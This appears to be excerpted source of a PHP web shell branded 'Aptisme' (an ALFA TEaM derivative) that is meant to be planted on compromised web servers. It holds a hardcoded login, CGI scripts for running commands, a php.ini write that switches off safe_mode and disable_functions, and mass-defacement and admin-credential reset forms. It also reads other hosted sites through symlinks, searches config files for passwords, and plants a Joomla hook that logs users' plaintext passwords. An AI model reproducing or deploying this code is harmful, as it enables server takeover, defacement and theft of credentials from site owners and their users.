...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'Aptisme',
    'password' => 'da169f158067f5384a633d1ba68216ef',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
define("__ALFA_CODE_NAME__", "Aptisme");
define("__PATHOS_FOLDER__", "PATHOS");
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"main_size" => "#ffcb4c",
		"main_modify" => "#ffcb4c",
		"main_owner_group" => "#ffcb4c",
		"main_green_perm" => "#0E304A",
		"main_red_perm" => "#FB0000",
...
<center><img style="border-radius:100px;" width="500" height="250" alt="Aptisme 2012" draggable="false" src="https://pngfre.com/wp-content/uploads/Venom-10-300x300.png" /></center>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["pathoscgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["pathoscgiapi"])){
			if(!@file_exists("pathoscgiapi/".$_COOKIE["pathoscgiapi"].".alfa")){
				$recreate = true;
				$lang = $_COOKIE["pathoscgiapi"];
			}
		}
		if(!isset($_COOKIE["pathoscgiapi"])||$recreate){
			...
			alfacgihtaccess('cgi', "pathoscgiapi/");
		}else{
			$lang = $_COOKIE["pathoscgiapi"];
		}
		$cgi_ext = ".alfa";
		if($lang=="aspx"){
			$cgi_ext = ".aspx";}$cgi_url = __PATHOS_FOLDER__."/pathoscgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("pathoscgiapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("pathoscgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="Aptisme 2012" draggable="false" src="https://giffiles.alphacoders.com/209/209558.gif" /></td>
</tr>
<tr>
...
function __showicon($r){
	...
	$s['alfamini']='https://i.pinimg.com/736x/07/db/59/07db59d936f8f6a827732c09feac6d3d.jpg';
...
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Aptisme Uploader</option><option value='my'>My Private Shell</option></select>";
...
<font color='#00A220'>Shell Coded By Man Was Matter (ALFA TEaM)</font><br>
<font color='#00A220'>Contact : solevisible@gmail.com</font><br>
<font color='#00A220'>Telegram Channel: @Aptisme</font><br>
<font color='#FFFFFF'>Skype : ehsan.invisible</font><br>
<font color='#FFFFFF'>Skype : sole.sad</font><br>
<font color='#FB0000'>Persian Gulf For Ever</font><br>
<font color='#FB0000'>Iranian Programmers</font><br>
<font color='#FB0000'>############</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["pathoscgiapi_mode"])&&!isset($_COOKIE["pathoscgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __PATHOS_FOLDER__);
	}
	@mkdir('pathoscgiapi',0755);
	__write_file("pathoscgiapi/".$name, __get_resource($source));
	@chmod("pathoscgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/pathoscgiapi';sh getheader.alfa",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ Aptisme &copy; 2012-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"BTC: 1KLty8LUqnqsXkM3Qkvy2Kpv4gLt7Ugcyo\");' style='color: #E91E63;text-decoration: none;'>Contact Us !</a></span> <span style='letter-spacing: 2px;color: #dfff00;'></span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://t.me/Aptonz'>@Aptonz</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/pathoscgiapi/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/pathoscgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#0E304A;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#0E304A;"><option value="name" '.($alfa_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($alfa_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($alfa_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#0E304A;"><option value="asc" '.($alfa_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($alfa_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#0E304A;" type="text" name="limited_number" value="'.$alfa_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#0E304A;">'.($count_dirContent-1).'</b></span></div><div class="header">';
if($dirContent == false){
...
$disabled_btn_style= 'background: #FB0000;color: #fff;';
}
if(!empty($_POST['alfa3'])){
...
<textarea name=index rows='19' cols='103'><title>Man Was Matter</title><b>Man Was Matter</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
...
<title>Man Was Matter</title><b>Man Was Matter</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
echo __pre()."<center><table border='1'><tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FB0000\">{$user}</font></b></td></tr><tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FB0000\">{$rep}</font></b></td></tr></table></center>";
...
<tr><td><b><font color=\"#FFFFFF\">User:</b></font></td><td><b><fontcolor=\"#FB0000\">".trim($ex[1])."</font></b></td></tr>
<tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FB0000\">{$rep}</font></b></td></tr></table></center>";break;}}}}}
...
@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Man Was Matter(ALFA TEaM)");
...
$site = $_POST['alfa4'];
if(empty($hacker)){
die (__pre()."<center><b><font color =\"#FB0000\">[+] YOU MUST FILL THE ATTACKER NAME [+]</font></b></center>");
}elseif($method == "------------------------------------SELECT-------------------------------------"){
die(__pre()."<center><b><font color =\"#FB0000\">[+] YOU MUST SELECT THE METHOD [+]</b></font></center>");
}elseif($neden == "------------------------------------SELECT-------------------------------------"){
die(__pre()."<center><b><font color =\"#FB0000\">[+] YOU MUST SELECT THE REASON [+]</b></font></center>");
}elseif(empty($site)){
die(__pre()."<center><b><font color =\"#FB0000\">[+] YOU MUST INTER THE SITES LIST [+]<font></b></center>");
}
$i = 0;
$sites = explode("\n", $site);
$alfa = new AlfaCURL();
...
$table = array('td1' =>
 ...
 'td6' =>
 array('color' => '#FB0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => '#FB0000', 'tdName' => 'Admin Pass', 'inputName' => 'kh', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => '#FB0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$table = array('td1' =>
 ...
 array('color' => '#FB0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => '#FB0000', 'tdName' => 'Admin Pass', 'inputName' => 'toftof', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => '#FB0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
$table = array('td1' =>
 ...
 array('color' => '#FB0000', 'tdName' => 'Admin User', 'inputName' => 'admin', 'inputValue' => 'admin', 'inputSize' => '50'),
 'td7' =>
 array('color' => '#FB0000', 'tdName' => 'Admin Pass', 'inputName' => 'hi', 'inputValue' => 'solevisible', 'inputSize' => '50', 'disabled' => true),
 'td8' =>
 array('color' => '#FB0000', 'tdName' => 'Admin Email', 'inputName' => 'email', 'inputValue' => 'solevisible@fbi.gov', 'inputSize' => '50')
);
create_table($table);
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __PATHOS_FOLDER__;
	if(!@is_dir($parent)){
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__PATHOS_FOLDER__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
$table_header = "<pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><table id='tbl_sympphp' align='center' width='40%' class='main' border='1'><td><span style='color:#FFFF01;'><b>*</span></b></td><td><span style='color:#00A220;'><b>Domains</span></b></td><td><span style='color:#FFFFFF;'><b>Users</span></b></td><td><span style='color:#FB0000;'><b>symlink</span></b></td>";
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__PATHOS_FOLDER__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FB0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__PATHOS_FOLDER__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FB0000;">Symlink</span></a></td></tr>';
if($sole){
...
foreach ($database_list as $db_name) {
	...
	if($db_name == $_POST['sql_base']){
		...
		$tbls_res =$db->listTables();echo '<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" target=".cls-'.$db_name.'" placeholder="Filter Table" onkeyup="alfaMysqlFilterTable(this);" name="filter"></div></li>';
...
@chmod($name,0755);
echo '<iframe src="'.__PATHOS_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
echo("<center><table border='1'>");
echo("<tr><td><b><font color=\"#ffcb4c\">Register</font></td><td>$registrar</td></tr></b>");
echo("<tr><td><b><font color=\"#ffcb4c\">Setting</font></td><td>$setting</td></tr></b>");
echo("<tr><td><b><font color=\"#ffcb4c\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
...
$bash_users  = alfaEx("cd ".$tmp_path."/pathoscgiapi;sh basedir.alfa ".$makepwd,false,true,true);
...
echo "<b><font color=\"#FB0000\">[~] Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>";
foreach($users as $user){
if(empty($user))continue;
$path = str_replace("{user}", $user, $makepwd);
echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#ffcb4c>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
}
...
$headers .= 'MIME-Designed By Aptisme' . "\r\n";
...
$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$PATHOS = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($PATHOS, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
$code=str_replace('{saveto_path}',$saveto,$code);
...
echo __pre();if(substr($dir,-1)=='/')$dir=substr($dir,0,-1);
...
return('<iframe src="'.__PATHOS_FOLDER__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
